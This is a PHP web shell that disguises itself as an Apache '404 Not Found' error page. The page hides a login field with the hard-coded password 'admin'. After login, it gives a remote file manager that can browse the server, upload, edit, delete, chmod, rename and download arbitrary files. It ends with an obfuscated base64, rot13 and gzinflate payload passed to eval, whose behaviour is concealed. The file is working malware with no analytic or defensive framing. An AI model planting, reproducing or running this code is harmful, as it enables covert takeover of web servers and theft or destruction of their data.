<?php
set_time_limit(0);
session_start();
if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
	  $_POST[$key] = stripslashes($value);
	}
}

function login() {
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL '.$_SERVER['REQUEST_URI'].' was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
    <center>
    <form method=post>
    <input type=password name=pass>
    </form></center></html>';
	exit();
}

if(isset($_POST['pass'])){
	if($_POST['pass'] == "admin"){
		$_SESSION['pass'] = $_POST['pass'];
		if($_SESSION['pass']){
			mainCOde();
		}
	}else{
	  login();
	}
}else{
	if(isset($_SESSION['pass'])){
       mainCOde(); 
	}else{
	  login();
	}
}

function mainCOde(){
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<style> 
body {background-color:#000;color:#fff;}  
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top; }  
span,h1,a{ color: #00ff00 !important; }  
span{ font-weight: bolder; }  
table{
border: 1px green dotted;
}
h1{ border:1px solid #00ff00;padding: 2px 5px;font: 14pt Verdana;margin:0px; }  
div.content{ padding: 5px;margin-left:5px;}  
a{ text-decoration:none; }  
a:hover{ background:#ff0000; }  
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }  
.bigarea{ width:100%;height:250px; }  
input, textarea, select{ margin:0;color:#00ff00;background-color:#000;border:1px solid #00ff00; font: 9pt Monospace,Courier New; }  
form{ margin:0px; }  
#toolsTbl{ text-align:center; }  
.toolsInp{ width: 80%; }  
.main th{text-align:left;}  
.main tr:hover{background-color:#5e5e5e;}  
.main td, th{vertical-align:middle;}  
pre{font-family:Courier,Monospace;} 
#cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}  

span > .buttonFolder {
    border: 0;
	font: 9pt Lucida,Verdana;
    line-height: 15px;
    color: #00ff00;
    width: auto;
    height: auto;
    box-sizing: content-box;
}

span > .buttonFile {
    font: 9pt Lucida,Verdana;
    border: 0;
    line-height: 15px;
    color: #57cb1b;
    width: auto;
    height: auto;
    box-sizing: content-box;
}

</style>
</HEAD>
<BODY>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><center><font color=red></center></tr></tr>
<tr><td> Uname : '.php_uname().' 
</tr></tr>
<tr><td><form method=\'post\' action="'.$_SERVER['REQUEST_URI'].'">Current Path : ';
	if(isset($_POST['path'])){
		$path = $_POST['path'];
	}else{
		$path = getcwd();
	}

	print "<input name='path' value='$path' style='width:500px;'><input type='submit' value='Go'></form>";
	echo '</td></tr>';

	if(isset($_FILES['file'])){
		if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
		$_SESSION['status'] = '<font color="green">File Upload Done.</font><br />';
		}else{
		$_SESSION['status'] = '<font color="red">Upload Error.</font><br />';
		}
	}
	echo '<tr><td>
	<form enctype="multipart/form-data" method="POST">
	Upload File : <input type="file" name="file" />
	<input type="submit" value="upload" />
	<input type="hidden" name="path" value="'.$path.'">
	</form>
	</td></tr>';
	
	if(isset($_POST['opt']) &&  $_POST['opt'] == 'delete'){
		if($_POST['type'] == 'dir'){
			if(rmdir($_POST['opt_path'])){
				$_SESSION['status'] = '<font color="green">Delete Dir Done.</font><br />';
			}else{
				$_SESSION['status'] = '<font color="red">Delete Dir Error.</font><br />';
			}
		}elseif($_POST['type'] == 'file'){
			if(unlink($_POST['opt_path'])){
				$_SESSION['status'] = '<font color="green">Delete File Done.</font><br />';
			}else{
				$_SESSION['status'] = '<font color="red">Delete File Error.</font><br />';
				}
		}
	}
	if(isset($_POST['opt']) &&  $_POST['opt'] == 'download'){
		if($_POST['type'] == 'file'){
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=".basename($_POST['opt_path']));
            if (function_exists("mime_content_type")) {
                $type = @mime_content_type($_POST['opt_path']);
                header("Content-Type: ".$type);
            }
            $fp = @fopen($_POST['opt_path'], "r");
            if($fp) {
                while(!@feof($fp))
                    echo @fread($fp, 1024);
                fclose($fp);
            }
		}
	}	
	if(isset($_SESSION['status'])){
		echo '<tr><td>Status : '.$_SESSION['status'].'</td></tr>';
		unset($_SESSION['status']);
	}	
	if(isset($_POST['filesrc'])){
		echo "<tr><td>Current File : ".$_POST['filesrc']."</td></tr>";
		echo '</table><br />';
		echo('<center><textarea style="width: 703px; height: 477px;" cols="80" name="src">'.htmlspecialchars(file_get_contents($_POST['filesrc'])).'</textarea></center>');
	}elseif(isset($_POST['opt']) && $_POST['opt'] != 'delete'){		
		if(isset($_POST['opt']) && isset($_POST['src']) && $_POST['opt'] == 'edit' ){
			$fp = fopen($_POST['opt_path'],'w');
			if(fwrite($fp,$_POST['src'])){
				$_SESSION['status'] = '<font color="green">Edit File Done.</font><br />';
			}else{
				$_SESSION['status'] =  '<font color="red">Edit File Fail.</font><br />';
			}
			fclose($fp);
		}

		if(isset($_POST['opt']) && isset($_POST['perm']) && $_POST['perm'] && $_POST['opt'] == 'chmod'){
			$perms = 0;
            for($i=strlen($_POST['perm'])-1;$i>=0;--$i){
				$perms += (int)$_POST['perm'][$i]*pow(8, (strlen($_POST['perm'])-$i-1));
			}
			if(@chmod($_POST['opt_path'],$perms)){
				$_SESSION['status'] = '<font color="green">Change Permission Done.</font><br />';
			}else{
				$_SESSION['status'] = '<font color="red">Change Permission Error.</font><br />';
			}
		}

		$rename_status =  false;
		if(isset($_POST['opt']) && isset($_POST['newname']) && $_POST['opt'] == 'rename'){
			if(rename($_POST['opt_path'],$path.'/'.$_POST['newname'])){
				$rename_status =  true;
				$_SESSION['status'] = '<font color="green">Change Name Done.</font><br />';
			}else{
				$_SESSION['status'] = '<font color="red">Change Name Error.</font><br />';
			}
			$_POST['name'] = $_POST['newname'];
		}
		
		echo "<tr><td>Current File : ".(isset($_POST['opt_path']) && $rename_status == false ?  $_POST['opt_path'] : ( $rename_status == true ? $path.'/'.$_POST['newname'] : $_POST['opt_path']))."</td></tr>";
		if(isset($_SESSION['status'])){
			echo '<tr><td>Status : '.$_SESSION['status'].'</td></tr>';
			unset($_SESSION['status']);
		}
		echo '</table><br />';
		echo '<center>';
		if($_POST['opt'] == 'chmod'){
			echo '<form method="POST">
					Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['opt_path'])), -4).'" />
					<input type="hidden" name="opt_path" value="'.$_POST['opt_path'].'">
					<input type="hidden" name="type" value="'.$_POST['type'].'">
					<input type="hidden" name="path" value="'.$_POST['path'].'">
					<input type="hidden" name="opt" value="chmod">
					<input type="submit" value="Go" />
				</form>';
		}elseif($_POST['opt'] == 'rename'){
			echo '<form method="POST">
					New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
					<input type="hidden" name="opt_path" value="'.$_POST['opt_path'].'">
					<input type="hidden" name="path" value="'.$_POST['path'].'">
					<input type="hidden" name="opt" value="rename">
					<input type="submit" value="Rename" />
				</form>';
		}elseif($_POST['opt'] == 'edit'){
			echo '<form method="POST">
			<textarea style="width: 703px; height: 477px;" cols="80" name="src">'.htmlspecialchars(file_get_contents($_POST['opt_path'])).'</textarea><br />
			<input type="hidden" name="opt_path" value="'.$_POST['opt_path'].'">
			<input type="hidden" name="path" value="'.$_POST['path'].'">
			<input type="hidden" name="opt" value="edit">
			<input type="submit" value="Edit" />
			</form>';
		}
		echo '</center>';
	}else{
		echo '</table><br />';
		$scandir = scandir($path);
		echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr class="first">
		<td><center>Name</center></td>
		<td><center>Size</center></td>
		<td><center>Permissions</center></td>
		<td><center>Options</center></td>
		</tr>';

		foreach($scandir as $dir){
		if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
		
		echo "<tr>
		<td><form action='".$_SERVER['REQUEST_URI']."' method='post'>
			<input type='hidden' name='path' value='$path/$dir'>
				<span><input type='submit' class='buttonFolder' value='$dir' /></span>
		</form></td><td><center>--</center></td>
		<td><center>";
		if(is_writable("$path/$dir")) echo '<font color="green">';
		elseif(!is_readable("$path/$dir")) echo '<font color="red">';
		echo perms("$path/$dir");
		if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

		echo "</center></td>
		<td><center><form method=\"POST\" action='".$_SERVER['REQUEST_URI']."'>
		<select name=\"opt\">
		<option value=\"\"></option>
		<option value=\"delete\">Delete</option>
		<option value=\"chmod\">Chmod</option>
		<option value=\"rename\">Rename</option>
		</select>
		<input type=\"hidden\" name=\"type\" value=\"dir\">
		<input type=\"hidden\" name=\"name\" value=\"$dir\">
		<input type=\"hidden\" name=\"opt_path\" value=\"$path/$dir\">
		<input type=\"hidden\" name=\"path\" value=\"$path\">
		<input type=\"submit\" value=\">\" />
		</form></center></td>
		</tr>";
		}
		echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
		foreach($scandir as $file){
		if(!is_file("$path/$file")) continue;
		$size = filesize("$path/$file")/1024;
		$size = round($size,3);
		if($size >= 1024){
		$size = round($size/1024,2).' MB';
		}else{
		$size = $size.' KB';
		}

		echo "<tr>
		<td><font color='#1cba0c'>
		<form action='".$_SERVER['REQUEST_URI']."' method='post'>
			<input type='hidden' name='filesrc' value='$path/$file'>
			<input type='hidden' name='path' value='$path'>
				<span><input type='submit' class='buttonFile' value='$file' /></span>
		</form>
		</td>
		<td><center>".$size."</center></td>
		<td><center>";
		if(is_writable("$path/$file")) echo '<font color="green">';
		elseif(!is_readable("$path/$file")) echo '<font color="red">';
		echo perms("$path/$file");
		if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
		echo "</center></td>
		<td><center><form method=\"POST\" action='".$_SERVER['REQUEST_URI']."'>
		<select name=\"opt\">
		<option value=\"\"></option>
		<option value=\"delete\">Delete</option>
		<option value=\"chmod\">Chmod</option>
		<option value=\"rename\">Rename</option>
		<option value=\"edit\">Edit</option>
		<option value=\"download\">Download</option>
		</select>
		<input type=\"hidden\" name=\"type\" value=\"file\">
		<input type=\"hidden\" name=\"name\" value=\"$file\">
		<input type=\"hidden\" name=\"opt_path\" value=\"$path/$file\">
		<input type=\"hidden\" name=\"path\" value=\"$path\">
		<input type=\"submit\" value=\">\" />
		</form></center></td>
		</tr>";
		}
		echo '</table>
		</div>';
	}
echo '</BODY>
</HTML>';
}
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
?>
